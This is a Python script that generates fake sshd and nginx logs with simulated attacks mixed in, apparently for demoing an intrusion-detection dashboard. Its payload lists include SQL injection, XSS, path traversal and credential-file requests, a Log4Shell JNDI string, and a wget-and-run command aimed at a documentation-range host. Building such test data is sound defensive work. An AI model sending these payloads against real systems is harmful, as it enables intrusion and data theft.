#!/usr/bin/env python3
"""Generate realistic sshd (auth.log) and nginx access logs with attacks mixed in.

Lets you demo the whole pipeline and dashboard without a server:

    python tools/generate_logs.py --out demo/logs --hours 24        # history only
    python tools/generate_logs.py --out demo/logs --hours 6 --follow # then keep appending

Every address comes from the documentation ranges reserved by RFC 5737
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and RFC 3849 (2001:db8::/32),
so nothing here points at a real host. 192.0.2.0/24 plays the legitimate
users; the other ranges are the "attackers" and are given fake countries in
demo/demo-geo.yml.

Only the standard library is used, so the script also runs in a bare container.
"""

from __future__ import annotations

import argparse
import contextlib
import heapq
import os
import random
import sys
import time
from collections.abc import Iterator
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path

HOST = "web1"

# --- vocabulary ------------------------------------------------------------------

USERNAMES = (
    ["root"] * 12
    + ["admin"] * 6
    + ["ubuntu"] * 4
    + ["user", "test", "oracle", "postgres", "git", "pi", "ftpuser", "guest", "deploy"]
    + ["support", "mysql", "debian", "centos", "hadoop", "nagios", "minecraft", "steam"]
    + ["jenkins", "ansible", "tomcat", "elastic", "dev", "www", "ubnt", "user1", "solana"]
)
VALID_USERS = {"root", "ubuntu", "deploy", "emre"}

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
SCANNER_UAS = [
    "sqlmap/1.8.11#stable (https://sqlmap.org)",
    "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000562)",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "gobuster/3.6",
    "Fuzz Faster U Fool v2.1.0-dev",
    "Mozilla/5.0 zgrab/0.x",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
    "WPScan v3.8.27 (https://wpscan.com/wordpress-security-scanner)",
]
SITE_PATHS = [
    "/", "/about", "/blog/", "/blog/2026/10/self-hosting-notes", "/blog/2026/11/hello-world",
    "/projects", "/contact", "/static/css/site.css", "/static/js/site.js",
    "/static/img/logo.svg", "/feed.xml", "/robots.txt", "/sitemap.xml",
]  # fmt: skip
SCAN_WORDLIST = [
    "/admin", "/administrator", "/wp-admin/", "/wp-login.php", "/phpmyadmin/", "/pma/",
    "/backup.zip", "/backup.sql", "/db.sql", "/old/", "/test/", "/dev/", "/api/v1/",
    "/console", "/manager/html", "/server-status", "/.DS_Store", "/config.php",
    "/install.php", "/setup.php", "/xmlrpc.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/cgi-bin/", "/shell.php", "/cmd.php", "/upload.php", "/uploads/", "/user/login",
    "/actuator/health", "/solr/admin/", "/jenkins/", "/owa/", "/remote/login",
    "/boaform/admin/formLogin", "/HNAP1/", "/login.action", "/debug/default/view",
    "/_profiler/", "/telescope/requests", "/druid/index.html", "/portal/", "/webadmin/",
]  # fmt: skip
TRAVERSAL = [
    "/../../../../etc/passwd",
    "/static/..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/download?file=..%252f..%252f..%252fetc%252fpasswd",
    "/index.php?page=....//....//....//etc/passwd",
    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts",
    "/view?template=..\\..\\..\\windows\\win.ini",
]
SQLI = [
    "/products?id=1%20UNION%20SELECT%20NULL,username,password%20FROM%20users--",
    "/login?user=admin%27%20OR%20%271%27=%271&pass=x",
    "/item?id=1%20AND%20SLEEP(5)",
    "/search?q=1%27%20AND%201=1%20--%20",
    "/news?id=-1%20union%20all%20select%201,2,group_concat(table_name)%20from%20information_schema.tables",
]
XSS = [
    "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
    "/comment?text=%3Cimg%20src=x%20onerror=alert(1)%3E",
    "/redirect?url=javascript:alert(1)",
    "/?q=%22%3E%3Csvg/onload=alert(1)%3E",
]
SENSITIVE = [
    "/.env", "/.env.production", "/.git/config", "/.git/HEAD", "/.aws/credentials",
    "/wp-config.php.bak", "/.htpasswd", "/id_rsa", "/phpinfo.php", "/.docker/config.json",
]  # fmt: skip
RCE = [
    "/?x=${jndi:ldap://198.51.100.77:1389/a}",
    "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)",
    "/shell?cd+/tmp;wget+http://198.51.100.77/x.sh;sh+x.sh",
]


def attacker_ip(rng: random.Random) -> str:
    roll = rng.random()
    if roll < 0.70:
        return f"203.0.113.{rng.randint(1, 254)}"
    if roll < 0.95:
        return f"198.51.100.{rng.randint(1, 254)}"
    return f"2001:db8:{rng.randint(1, 0xFFFF):x}::{rng.randint(1, 0xFFFF):x}"


def visitor_ip(rng: random.Random) -> str:
    return f"192.0.2.{rng.randint(30, 254)}"


# --- line formatting -----------------------------------------------------------------


@dataclass(order=True)
class Line:
    ts: datetime
    target: str = field(compare=False)  # "auth" | "nginx"
    text: str = field(compare=False)


class Formatter:
    def __init__(self, auth_format: str, rng: random.Random) -> None:
        self.auth_format = auth_format
        self.rng = rng

    def auth(self, ts: datetime, msg: str) -> Line:
        pid = self.rng.randint(1000, 99999)
        if self.auth_format == "classic":
            stamp = f"{ts.strftime('%b')} {ts.day:>2} {ts.strftime('%H:%M:%S')}"
            prog = "sshd"
        else:
            stamp = ts.isoformat(timespec="microseconds")
            prog = "sshd-session"  # what OpenSSH >= 9.8 logs
        return Line(ts, "auth", f"{stamp} {HOST} {prog}[{pid}]: {msg}")

    def nginx(
        self, ts: datetime, ip: str, path: str, status: int, ua: str, method: str = "GET"
    ) -> Line:
        stamp = ts.strftime("%d/%b/%Y:%H:%M:%S +0000")
        size = self.rng.randint(150, 40000) if status == 200 else self.rng.randint(150, 600)
        ref = "-" if self.rng.random() < 0.7 else "https://www.example.org/"
        return Line(
            ts,
            "nginx",
            f'{ip} - - [{stamp}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"',
        )


# --- scenarios: each yields Lines starting at `t` ------------------------------------


def ssh_failure(f: Formatter, t: datetime, ip: str, user: str) -> Iterator[Line]:
    port = f.rng.randint(30000, 65000)
    if user in VALID_USERS:
        yield f.auth(t, f"Failed password for {user} from {ip} port {port} ssh2")
    else:
        yield f.auth(t, f"Invalid user {user} from {ip} port {port}")
        yield f.auth(
            t + timedelta(seconds=2),
            f"Failed password for invalid user {user} from {ip} port {port} ssh2",
        )


def ssh_bruteforce(f: Formatter, t: datetime) -> Iterator[Line]:
    ip = attacker_ip(f.rng)
    for _ in range(f.rng.randint(8, 60)):
        yield from ssh_failure(f, t, ip, f.rng.choice(USERNAMES))
        t += timedelta(seconds=f.rng.uniform(0.8, 6))


def ssh_slow_probe(f: Formatter, t: datetime) -> Iterator[Line]:
    """A couple of attempts, well below any threshold - the everyday internet noise."""
    ip = attacker_ip(f.rng)
    for _ in range(f.rng.randint(1, 3)):
        yield from ssh_failure(f, t, ip, f.rng.choice(USERNAMES))
        t += timedelta(seconds=f.rng.uniform(5, 40))


def ssh_user_enumeration(f: Formatter, t: datetime) -> Iterator[Line]:
    ip = attacker_ip(f.rng)
    for user in f.rng.sample([u for u in set(USERNAMES) if u not in VALID_USERS], 12):
        yield f.auth(t, f"Invalid user {user} from {ip} port {f.rng.randint(30000, 65000)}")
        t += timedelta(seconds=f.rng.uniform(1, 15))


def ssh_success_after_failures(f: Formatter, t: datetime) -> Iterator[Line]:
    ip = attacker_ip(f.rng)
    for _ in range(6):
        yield f.auth(
            t, f"Failed password for deploy from {ip} port {f.rng.randint(30000, 65000)} ssh2"
        )
        t += timedelta(seconds=f.rng.uniform(2, 8))
    yield f.auth(t, f"Accepted password for deploy from {ip} port 52811 ssh2")


def ssh_root_login(f: Formatter, t: datetime) -> Iterator[Line]:
    yield f.auth(
        t,
        "Accepted publickey for root from 192.0.2.20 port 50122 ssh2: "
        "ED25519 SHA256:9vYb0k3bDq2YkGgS3m0lq0iG8bV1d6k0y3n0h5l2xQk",
    )


def ssh_admin_login(f: Formatter, t: datetime) -> Iterator[Line]:
    yield f.auth(
        t,
        f"Accepted publickey for emre from 192.0.2.10 port {f.rng.randint(40000, 60000)} ssh2: "
        "ED25519 SHA256:Qk2l5h0n3y0k6d1Vb8Gi0ql0m3SgGkY2qDb3k0bYv9",
    )


def web_browsing(f: Formatter, t: datetime) -> Iterator[Line]:
    ip, ua = visitor_ip(f.rng), f.rng.choice(BROWSERS)
    for _ in range(f.rng.randint(1, 6)):
        path = f.rng.choice(SITE_PATHS)
        status = 304 if path.startswith("/static") and f.rng.random() < 0.3 else 200
        if f.rng.random() < 0.03:
            path, status = "/favicon.ico", 404  # the classic harmless 404
        yield f.nginx(t, ip, path, status, ua)
        t += timedelta(seconds=f.rng.uniform(0.2, 20))


def web_dir_scan(f: Formatter, t: datetime) -> Iterator[Line]:
    ip = attacker_ip(f.rng)
    ua = f.rng.choice([*BROWSERS[:2], "gobuster/3.6", "Fuzz Faster U Fool v2.1.0-dev"])
    for path in f.rng.sample(SCAN_WORDLIST, f.rng.randint(25, len(SCAN_WORDLIST))):
        yield f.nginx(t, ip, path, 404, ua)
        t += timedelta(seconds=f.rng.uniform(0.05, 1.2))


def web_vuln_scanner(f: Formatter, t: datetime) -> Iterator[Line]:
    ip, ua = attacker_ip(f.rng), f.rng.choice(SCANNER_UAS)
    for path in f.rng.sample(SQLI + XSS + TRAVERSAL, 6):
        yield f.nginx(t, ip, path, f.rng.choice([400, 403, 404]), ua)
        t += timedelta(seconds=f.rng.uniform(0.2, 2))


def web_single_probe(f: Formatter, t: datetime) -> Iterator[Line]:
    ip = attacker_ip(f.rng)
    pool = f.rng.choice([TRAVERSAL, SQLI, XSS, SENSITIVE, SENSITIVE, RCE])
    yield f.nginx(t, ip, f.rng.choice(pool), f.rng.choice([400, 403, 404]), f.rng.choice(BROWSERS))


# (scenario, expected occurrences per hour)
SCENARIOS = [
    (web_browsing, 240.0),
    (ssh_slow_probe, 40.0),
    (web_single_probe, 12.0),
    (ssh_bruteforce, 2.5),
    (ssh_user_enumeration, 0.8),
    (web_dir_scan, 1.0),
    (web_vuln_scanner, 0.6),
    (ssh_admin_login, 0.3),
    (ssh_success_after_failures, 0.05),
    (ssh_root_login, 0.04),
]


def history(f: Formatter, start: datetime, end: datetime) -> list[Line]:
    lines: list[Line] = []
    hours = (end - start).total_seconds() / 3600
    for scenario, per_hour in SCENARIOS:
        n = max(1, round(per_hour * hours * f.rng.uniform(0.7, 1.3)))
        if per_hour < 0.1 and f.rng.random() > per_hour * hours:
            n = 0
        for _ in range(n):
            t = start + timedelta(seconds=f.rng.uniform(0, (end - start).total_seconds()))
            lines.extend(line for line in scenario(f, t) if line.ts <= end)
    # Make sure the rare "critical" scenarios appear at least once in a demo.
    t = end - timedelta(minutes=f.rng.uniform(20, 50))
    lines.extend(ssh_success_after_failures(f, t))
    lines.extend(ssh_root_login(f, end - timedelta(minutes=5)))
    lines.sort()
    return lines


# --- output ----------------------------------------------------------------------------


class Writer:
    def __init__(self, out: Path, rotate_after: int = 0) -> None:
        self.paths = {"auth": out / "auth.log", "nginx": out / "access.log"}
        self.rotate_after = rotate_after
        self.counts = {"auth": 0, "nginx": 0}

    def reset(self) -> None:
        for p in self.paths.values():
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text("", encoding="utf-8")

    def write(self, lines: list[Line]) -> None:
        by_target: dict[str, list[str]] = {"auth": [], "nginx": []}
        for line in lines:
            by_target[line.target].append(line.text)
        for target, texts in by_target.items():
            if not texts:
                continue
            with open(self.paths[target], "a", encoding="utf-8", newline="\n") as fh:
                fh.write("\n".join(texts) + "\n")
            self.counts[target] += len(texts)
            if self.rotate_after and self.counts[target] >= self.rotate_after:
                self.rotate(target)

    def rotate(self, target: str) -> None:
        """Mimic logrotate's default 'create' mode: rename to .1, start a fresh file."""
        path = self.paths[target]
        os.replace(path, path.with_name(path.name + ".1"))
        path.write_text("", encoding="utf-8")
        self.counts[target] = 0
        print(f"rotated {path}", file=sys.stderr)


def follow(f: Formatter, writer: Writer, speed: float) -> None:
    """Append new activity in real time.

    ``speed`` > 1 makes attacks arrive more often and plays each burst faster;
    the timestamps inside a burst keep their natural spacing, which is what
    the rule windows look at.
    """
    queue: list[Line] = []
    rates = [(s, r / 3600 * speed) for s, r in SCENARIOS]
    last = time.monotonic()
    print("following - Ctrl+C to stop", file=sys.stderr)
    while True:
        time.sleep(0.25)
        now_mono = time.monotonic()
        elapsed, last = now_mono - last, now_mono
        now = datetime.now(UTC)
        for scenario, per_second in rates:
            # Poisson arrivals: expected per_second * elapsed starts in this tick.
            expected = per_second * elapsed
            starts = int(expected) + (1 if f.rng.random() < expected % 1 else 0)
            for _ in range(starts):
                for line in scenario(f, now):
                    # compress the scenario's own timeline by `speed` as well
                    offset = (line.ts - now) / speed
                    heapq.heappush(queue, Line(now + offset, line.target, line.text))
        due: list[Line] = []
        while queue and queue[0].ts <= now:
            due.append(heapq.heappop(queue))
        if due:
            writer.write(due)


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
    p.add_argument("--out", default="demo/logs", help="output directory (default: demo/logs)")
    p.add_argument("--hours", type=float, default=24, help="hours of history to generate")
    p.add_argument("--follow", action="store_true", help="keep appending live activity")
    p.add_argument("--speed", type=float, default=1.0, help="time compression in --follow mode")
    p.add_argument(
        "--auth-format",
        choices=["classic", "rfc3339"],
        default="classic",
        help="classic: 'Nov 18 10:15:01' (Ubuntu 22.04 and older); "
        "rfc3339: Debian 12 / Ubuntu 24.04",
    )
    p.add_argument("--rotate-after", type=int, default=0, help="rotate a file after N lines")
    p.add_argument("--seed", type=int, help="random seed for reproducible output")
    p.add_argument("--append", action="store_true", help="do not truncate existing files")
    args = p.parse_args(argv)

    rng = random.Random(args.seed)
    fmt = Formatter(args.auth_format, rng)
    writer = Writer(Path(args.out), args.rotate_after)
    if not args.append:
        writer.reset()

    if args.hours > 0:
        end = datetime.now(UTC)
        lines = history(fmt, end - timedelta(hours=args.hours), end)
        writer.write(lines)
        auth = sum(1 for line in lines if line.target == "auth")
        print(
            f"wrote {auth} auth.log and {len(lines) - auth} access.log lines "
            f"covering {args.hours:g}h to {args.out}",
            file=sys.stderr,
        )
    if args.follow:
        with contextlib.suppress(KeyboardInterrupt):
            follow(fmt, writer, args.speed)
    return 0


if __name__ == "__main__":
    sys.exit(main())
